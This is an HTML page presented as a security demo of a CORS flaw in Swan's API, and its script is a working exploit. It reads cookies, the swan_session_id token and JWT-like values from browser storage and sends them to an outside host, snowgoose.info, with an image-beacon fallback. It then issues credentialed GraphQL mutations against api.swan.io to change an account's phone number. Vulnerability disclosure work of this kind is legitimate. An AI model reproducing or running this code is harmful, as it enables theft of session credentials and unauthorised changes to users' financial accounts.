<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swan API Security Test</title>
    <style>
        body { font-family: system-ui, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        h1 { color: #c41e3a; }
        pre { background: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; }
        .log { border: 1px solid #ddd; padding: 10px; height: 200px; overflow: auto; margin: 10px 0; font-family: monospace; }
        button { margin: 5px; padding: 8px 15px; cursor: pointer; }
        .note { background: #fffde7; padding: 10px; border-left: 4px solid #ffd600; margin-bottom: 20px; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <h1>Swan API JWT Exfiltration</h1>
    
    <div class="note">
        <p><strong>Security Vulnerability Demo:</strong> This page demonstrates the CORS vulnerability in Swan's API by capturing authentication tokens and using them to execute GraphQL queries.</p>
    </div>

    <button onclick="startExploit()">Start Exploit</button>
    <div id="log" class="log"></div>

    <script>
        // Configuration
        const EXFIL_ENDPOINT = 'https://snowgoose.info/swan-capture';
        const SWAN_ENDPOINTS = [
            'https://api.swan.io/admin-auth/graphql',
            'https://api.swan.io/admin/graphql'
        ];
        
        // Logging function
        function log(message, type = 'info') {
            const container = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            const className = type === 'error' ? 'error' : type === 'success' ? 'success' : '';
            container.innerHTML += `<div class="${className}">[${timestamp}] ${message}</div>`;
            container.scrollTop = container.scrollHeight;
        }
        
        // Extract all cookies and send them to exfiltration server
        function exfiltrateData(data) {
            // Send data via fetch
            fetch(EXFIL_ENDPOINT, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data),
                mode: 'no-cors'
            }).catch(e => {
                log(`Fetch exfiltration failed: ${e.message}`, 'error');
                
                // Fallback to image-based exfiltration
                try {
                    const img = new Image();
                    img.src = `${EXFIL_ENDPOINT}/img?data=${encodeURIComponent(JSON.stringify(data))}`;
                    document.body.appendChild(img);
                    log('Using image fallback for exfiltration', 'info');
                } catch(e2) {
                    log(`Image exfiltration failed: ${e2.message}`, 'error');
                }
            });
        }
        
        // Test a GraphQL mutation to showcase high impact
        async function testGraphQLMutation(endpoint, token) {
            try {
                log(`Testing GraphQL mutation at ${endpoint}`, 'info');
                
                // Generate random phone number for testing
                const randomNum = Math.floor(Math.random() * 90000000) + 10000000;
                const newPhone = `+336${randomNum}`;
                
                // Prepare headers based on authentication type
                let headers = {
                    'Content-Type': 'application/json'
                };
                
                // If we have a token, use it as a bearer token
                if (token) {
                    if (token.startsWith('Bearer ') || token.startsWith('bearer ')) {
                        headers['Authorization'] = token;
                    } else {
                        headers['Authorization'] = `Bearer ${token}`;
                    }
                }
                
                // Include credentials to send any cookies
                const response = await fetch(endpoint, {
                    method: 'POST',
                    credentials: 'include',
                    headers: headers,
                    body: JSON.stringify({
                        query: `mutation {
                            startPhoneNumberModification(input:{
                                oldPhoneNumber:"+33600000001",
                                newPhoneNumber:"${newPhone}"
                            }) {
                                __typename
                                ... on StartPhoneNumberModificationSuccessPayload {
                                    phoneNumberModification { id }
                                }
                                ... on PhoneNumberModificationAlreadyExistsRejection { message }
                                ... on TooManyPhoneNumberModificationRejection { message }
                            }
                        }`
                    })
                });
                
                // Check response
                const data = await response.json();
                log(`GraphQL mutation response: ${JSON.stringify(data)}`, 'info');
                
                // Determine if the mutation was successful
                if (data.data?.startPhoneNumberModification) {
                    const typeName = data.data.startPhoneNumberModification.__typename;
                    if (typeName === 'StartPhoneNumberModificationSuccessPayload') {
                        log(`🚨 CRITICAL IMPACT! Successfully modified phone number to ${newPhone}`, 'success');
                        
                        // Exfiltrate the successful result
                        exfiltrateData({
                            event: 'successful_graphql_mutation',
                            mutation: 'startPhoneNumberModification',
                            result: data,
                            endpoint: endpoint,
                            token: token ? '****' : null  // Don't include the actual token in logs
                        });
                        
                        return true;
                    } else if (typeName.includes('Rejection')) {
                        log(`Mutation processed but rejected: ${typeName}`, 'info');
                        return false;
                    }
                } else if (data.errors) {
                    const errorMsg = data.errors[0]?.message || 'Unknown error';
                    log(`GraphQL error: ${errorMsg}`, 'error');
                    
                    // Check if it's an authentication error
                    if (errorMsg.includes('Unauthenticated') || errorMsg.includes('Forbidden')) {
                        log('Authentication required for this endpoint', 'error');
                    }
                    
                    return false;
                }
                
                return false;
            } catch (error) {
                log(`Error testing GraphQL: ${error.message}`, 'error');
                return false;
            }
        }
        
        // Extract JWT from swan_session_id cookie
        function extractJWTFromCookie(cookieString) {
            try {
                const cookies = cookieString.split(';');
                for (const cookie of cookies) {
                    const [name, value] = cookie.trim().split('=');
                    if (name === 'swan_session_id') {
                        // Try to decode the cookie value (it might be URL encoded)
                        let decodedValue;
                        try {
                            decodedValue = decodeURIComponent(value);
                        } catch (e) {
                            decodedValue = value;
                        }
                        
                        // Check if it looks like a JWT (base64 segments separated by dots)
                        if (decodedValue.match(/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/)) {
                            log('Found JWT-like token in swan_session_id cookie', 'success');
                            return decodedValue;
                        } else {
                            log('swan_session_id cookie found but does not appear to be a JWT', 'info');
                            return decodedValue;  // Return it anyway, might be usable
                        }
                    }
                }
            } catch (e) {
                log(`Error extracting JWT: ${e.message}`, 'error');
            }
            return null;
        }
        
        // Search for JWTs in localStorage and sessionStorage
        function searchStorageForJWT() {
            const jwtPattern = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/;
            const tokens = [];
            
            try {
                // Check localStorage
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    
                    if (jwtPattern.test(value)) {
                        tokens.push({ source: 'localStorage', key, value });
                    }
                }
                
                // Check sessionStorage
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    
                    if (jwtPattern.test(value)) {
                        tokens.push({ source: 'sessionStorage', key, value });
                    }
                }
            } catch (e) {
                log(`Error searching storage: ${e.message}`, 'error');
            }
            
            return tokens;
        }
        
        // Main exploit function
        async function startExploit() {
            log('Starting Swan API exploitation...', 'info');
            
            // Step 1: Collect all cookies
            const cookies = document.cookie;
            log(`Found ${cookies.split(';').length} cookies`, 'info');
            
            // Step 2: Extract swan_session_id
            const tokenFromCookie = extractJWTFromCookie(cookies);
            if (tokenFromCookie) {
                log('Extracted potential token from cookies', 'success');
            } else {
                log('No Swan session token found in cookies', 'info');
            }
            
            // Step 3: Search for JWTs in storage
            const storageTokens = searchStorageForJWT();
            if (storageTokens.length > 0) {
                log(`Found ${storageTokens.length} potential JWT tokens in storage`, 'success');
            }
            
            // Step 4: Exfiltrate all collected data
            const exfilData = {
                cookies,
                tokenFromCookie,
                storageTokens,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            log('Exfiltrating collected data to snowgoose.info...', 'info');
            exfiltrateData(exfilData);
            
            // Step 5: Test GraphQL endpoints using CORS vulnerability
            log('Testing GraphQL endpoints with CORS vulnerability...', 'info');
            
            let mutationSuccess = false;
            
            // Try each endpoint with credentials (cookies)
            for (const endpoint of SWAN_ENDPOINTS) {
                log(`Testing endpoint ${endpoint} with cookies...`, 'info');
                mutationSuccess = await testGraphQLMutation(endpoint);
                
                if (mutationSuccess) {
                    log(`Successful exploitation via CORS with cookies at ${endpoint}`, 'success');
                    break;
                }
                
                // If we have a token from cookie, try with that
                if (tokenFromCookie) {
                    log(`Testing with extracted token at ${endpoint}...`, 'info');
                    mutationSuccess = await testGraphQLMutation(endpoint, tokenFromCookie);
                    
                    if (mutationSuccess) {
                        log(`Successful exploitation with extracted token at ${endpoint}`, 'success');
                        break;
                    }
                }
                
                // Try any tokens found in storage
                for (const tokenObj of storageTokens) {
                    log(`Testing with ${tokenObj.source} token at ${endpoint}...`, 'info');
                    mutationSuccess = await testGraphQLMutation(endpoint, tokenObj.value);
                    
                    if (mutationSuccess) {
                        log(`Successful exploitation with ${tokenObj.source} token at ${endpoint}`, 'success');
                        break;
                    }
                }
            }
            
            // Final result
            if (mutationSuccess) {
                log('🚨 CORS VULNERABILITY CONFIRMED WITH HIGH IMPACT! Successfully executed GraphQL mutation using credentials.', 'success');
            } else {
                log('Could not successfully execute GraphQL mutations. Try visiting dashboard.swan.io first to get valid cookies.', 'error');
            }
        }
    </script>
</body>
</html>
